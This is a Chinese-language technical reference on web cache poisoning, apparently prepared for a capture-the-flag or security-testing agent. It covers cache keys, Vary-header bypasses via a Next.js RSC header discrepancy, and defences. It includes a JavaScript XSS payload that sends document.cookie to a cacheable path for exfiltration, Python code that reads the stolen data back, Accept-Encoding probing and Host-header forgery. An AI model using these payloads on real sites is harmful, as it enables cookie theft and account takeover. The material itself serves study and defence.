# Web Cache Poisoning 专题

> Web Cache Poisoning 深度参考。

---

## 1. 缓存投毒原理

### 1.1 什么是 Web 缓存？

反向代理（nginx/Cloudflare/Akamai）在用户和源服务器之间缓存响应：

```
用户请求 → 反向代理 → 检查缓存 → 命中(HIT): 返回缓存副本
                                    → 未命中(MISS): 转发到源服务器 → 缓存响应 → 返回给用户
```

### 1.2 缓存投毒的核心问题

**缓存把"只能影响自己的攻击"变成了"能影响其他用户的攻击"。**

```
无缓存:
  攻击者发恶意请求 → 只有攻击者收到恶意响应 → Self-XSS（无意义）

有缓存:
  攻击者发恶意请求 → 缓存存储恶意响应
  其他用户请求同一 URL → 命中缓存 → 收到恶意响应 → 被 XSS！
```

### 1.3 缓存投毒的必要条件

1. **存在缓存机制**：反向代理/CDN 配置了缓存
2. **攻击者能控制响应内容**：通过请求头/参数注入
3. **控制的内容在缓存键之外**（unkeyed）或缓存键可控
4. **缓存响应能命中其他用户**：缓存键匹配
5. **响应被浏览器解析为 HTML**：Content-Type 正确

---

## 2. 缓存键分析

### 2.1 缓存键的组成

缓存键决定了"两个请求是否命中同一缓存条目"：

```
缓存键 = HTTP Method + URL路径 + 查询参数 + Host + Vary头指定的请求头
```

**典型 nginx 缓存键**：
```
proxy_cache_key $scheme$host$request_uri;
# = http + proxy:4000 + /_next/page
```

### 2.2 主键 vs 二级键

| 键类型 | 来源 | 匹配规则 |
|--------|------|---------|
| 主键 | `proxy_cache_key` 指令 | 精确匹配（Method + Host + URL） |
| 二级键 | `Vary` 响应头 | 指定的请求头值必须匹配 |

**Vary 头示例**：
```
Vary: rsc, next-router-state-tree, next-router-prefetch, Accept-Encoding
```
意味着缓存会为 `rsc` + `next-router-state-tree` + `next-router-prefetch` + `Accept-Encoding` 的每个不同组合存储不同的缓存条目。

### 2.3 缓存键分析清单

分析缓存投毒时，逐一回答：

- [ ] 哪些路径被缓存？（看 proxy 配置）
- [ ] 缓存主键包含什么？（Host? Scheme? Query String?）
- [ ] 响应的 Vary 头包含什么？
- [ ] 攻击者能控制哪些请求头？
- [ ] 控制的头在缓存键中吗？
- [ ] 目标用户（Bot/其他用户）的请求头值是什么？
- [ ] 攻击者的缓存键和目标用户的缓存键能匹配吗？

---

## 3. Vary 头绕过

### 3.1 Vary 头的作用

Vary 头告诉缓存："这个响应会根据哪些请求头的值而变化"。

```
Vary: Accept-Encoding
→ 缓存为每种 AE 值存不同副本
→ Accept-Encoding: gzip 和 Accept-Encoding: gzip, deflate 是不同的缓存条目
```

### 3.2 常见绕过方式

| 方式 | 原理 | 条件 |
|------|------|------|
| **空值 vs 缺失** | 框架检查 `!== undefined` vs `=== '1'`，空值通过宽松检查但 Vary 匹配时等同于缺失 | 两个模块对同一头有不同判断 |
| **值标准化差异** | 代理和源服务器对同一头的值解析/标准化方式不同 | 如 AE 排序、空格处理 |
| **未列在 Vary 中的头** | 响应内容受某头影响，但 Vary 未列出该头 | 应用漏洞/配置遗漏 |

### 3.3 空值绕过的经典 case（futurejs）

**问题**：Next.js 框架内部两个文件对 `RSC` 请求头的判断不一致：

```javascript
// base-server.js（请求调度器）— 严格检查
isRSCRequest = req.headers['rsc'] === '1'  // 空字符串 → false

// app-render.js（渲染引擎）— 宽松检查
isRSCRequest = headers['rsc'] !== undefined  // 空字符串 → true
```

**结果**：发送 `RSC: ""`（空字符串）时：
- base-server.js 认为不是 RSC 请求（`"" !== "1"`）
- app-render.js 按 RSC 模式渲染（`"" !== undefined`）
- Vary 头的 `rsc` 字段值为空字符串
- Bot 不发 RSC 头 → Vary 的 `rsc` 字段也为空字符串
- **缓存键匹配**！

---

## 4. 组合利用

### 4.1 缓存投毒 + XSS

最常见的组合利用模式：

```
1. 找到反射点（用户输入出现在响应中）
2. 找到绕过转义的方式（框架渲染差异 / 编码绕过）
3. 确保响应 Content-Type 为 text/html
4. 找到缓存机制（反向代理缓存）
5. 构造缓存键匹配（Host/Vary 头值对齐）
6. 发送投毒请求 → 缓存存储 XSS 响应
7. 其他用户访问 → 命中缓存 → 执行 XSS
```

### 4.2 缓存中缓存（数据渗出）

当目标环境无外网（Docker 隔离）时，XSS 无法外传数据。解法：

```
1. XSS 读取敏感数据（如 document.cookie）
2. XSS 将数据作为请求头发送到同一域名的另一个缓存路径
   fetch('/_next/exfil', {headers: {'x-nonce': 'STOLEN:' + document.cookie}})
3. 数据被写入缓存
4. 攻击者从外部访问该缓存路径 → 读取数据
```

**原理**：缓存只关心"请求/响应"，不关心"数据流向"。攻击者让目标的服务器帮自己"暂存"数据。

---

## 5. 防御措施

### 5.1 缓存配置

| 防御 | 说明 |
|------|------|
| 只缓存静态资源 | 避免缓存动态内容（HTML/API 响应） |
| 缓存键包含所有影响响应的头 | Vary 头必须完整列出所有相关头 |
| 禁用带请求头的缓存 | 不缓存非标准请求头的响应 |

### 5.2 应用层防御

| 防御 | 说明 |
|------|------|
| 输入验证/转义 | 所有用户输入在输出前转义 |
| Content-Type 严格 | 动态响应的 CT 固定，不依赖请求头 |
| CSP 头 | 即使被注入 HTML，CSP 也限制脚本执行 |
| Cookie HttpOnly + Secure | 减轻 XSS 的影响 |

### 5.3 框架层面

| 防御 | 说明 |
|------|------|
| 统一请求头检查逻辑 | 消除同一框架内不同模块的判断差异 |
| Vary 头自动管理 | 框架自动设置正确的 Vary 头 |
| 缓存控制头 | `Cache-Control: private` / `no-store` 防止缓存 |

---

## 6. 缓存中缓存数据渗出

> 当目标环境无外网（Docker 隔离）时，XSS 无法将数据发送到外部服务器。解法是利用缓存本身作为数据传递通道。

### 6.1 原理

XSS 代码不把数据发到外部，而是发到目标网站的另一个可缓存路径，让数据被缓存。攻击者再从外部读取该缓存。

```
第一阶段：攻击者投毒缓存（注入 XSS 到 /_next/attack-path）
第二阶段：XSS 在受害者浏览器中执行，将 Cookie/数据通过请求头发送到 /_next/exfil-path
          → 数据出现在 /_next/exfil-path 的响应中 → 被缓存
第三阶段：攻击者请求 /_next/exfil-path → 命中缓存 → 读取数据
```

### 6.2 XSS payload 模式

```javascript
// XSS 代码：读取 Cookie，写入另一个缓存路径
var c = document.cookie;
fetch('/_next/exfil', {
  headers: {
    'Content-Type': 'text/html',   // 触发 CT 覆盖（如果 middleware 支持）
    'RSC': '',                      // 触发 RSC 渲染（如果需要）
    'x-nonce': 'STOLEN:' + c       // 数据作为请求头值，反射到响应中
  }
}).catch(function(){});
```

### 6.3 适用条件

| 条件 | 说明 |
|------|------|
| 目标无外网 | Docker 隔离或网络管控 |
| 有可缓存的路径 | nginx 配置了 `proxy_cache` 的路径 |
| 反射点存在 | 请求数据会出现在响应中（如 nonce 反射） |
| 缓存键可控 | 攻击者能构造与 Bot 相同的缓存键 |

### 6.4 攻击者读取数据

```python
# 第三阶段：读取渗出数据
r = request('GET', '/_next/exfil', {
    'Host': 'proxy:4000',              # 匹配内部缓存键
    'Accept-Encoding': 'gzip, deflate' # 匹配 Bot 的 AE
})
if 'STOLEN:' in r['body']:
    flag = r['body'][r['body'].find('STOLEN:'):]
    print(f'FLAG: {flag}')
```

### 6.5 现实意义

| 场景 | 适用性 |
|------|-------|
| 受害者网络有管控（只能访问内网） | 适用 |
| 攻击者域名被封锁 | 适用 |
| 不想留下外部服务器痕迹 | 适用 |
| 受害者有外网访问 | 不需要（直接 webhook 外泄更简单） |

---

## 7. Bot 浏览器请求头探测

### 7.1 AE（Accept-Encoding）探测

**问题**：投毒时带的 AE 必须和 Bot 浏览器的 AE 精确匹配（Vary: Accept-Encoding）。

**探测方法**：利用缓存命中状态反推。

```
步骤 1：选一个没被访问过的新路径（确保缓存为空）
步骤 2：让 Bot 访问该路径（创建以 Bot AE 为二级键的缓存）
步骤 3：攻击者用不同 AE 值读取该路径
        → X-Proxy-Cache: HIT 的那个 AE 就是 Bot 的 AE
```

**脚本**（详见 `$AGENT_DIR/scripts/cache_poison.py` 的 `probe_accept_encoding` 函数）：

```python
ae_candidates = [
    'gzip, deflate, br',
    'gzip, deflate',
    'gzip',
    'gzip, br',
    'deflate',
    'identity',
]

for ae in ae_candidates:
    r = request('GET', probe_path, {'Accept-Encoding': ae})
    if r['cache'] == 'HIT':
        print(f'Bot AE: {ae}')
        break
```

**注意**：Docker 中使用系统包版 Chromium（非 Google Chrome）通常不支持 Brotli，AE 不含 `br`。

### 7.2 Host 头对齐

**问题**：攻击者从外网访问（Host: 外网IP），Bot 从内网访问（Host: 内部服务名），缓存主键不同。

**解决**：投毒时手动设置 `Host` 为 Bot 使用的内部域名。

```python
conn.request('GET', '/_next/attack', headers={
    'Host': 'proxy:4000',          # 伪造为内部域名
    'Accept-Encoding': bot_ae,     # 匹配 Bot 的 AE
    # ... 其他头
})
```

**注意**：浏览器的 Fetch API 禁止修改 `Host` 头，必须用 Python/curl 等工具。
